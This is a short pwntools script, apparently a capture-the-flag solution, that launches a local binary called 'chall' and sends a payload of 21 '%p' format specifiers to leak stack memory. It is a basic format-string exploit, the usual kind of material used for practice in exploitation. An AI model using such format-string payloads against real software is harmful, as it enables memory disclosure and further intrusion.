from pwn import*

p = process("./chall")

payload = b"%p "*21

p.sendline(payload)
p.interactive()
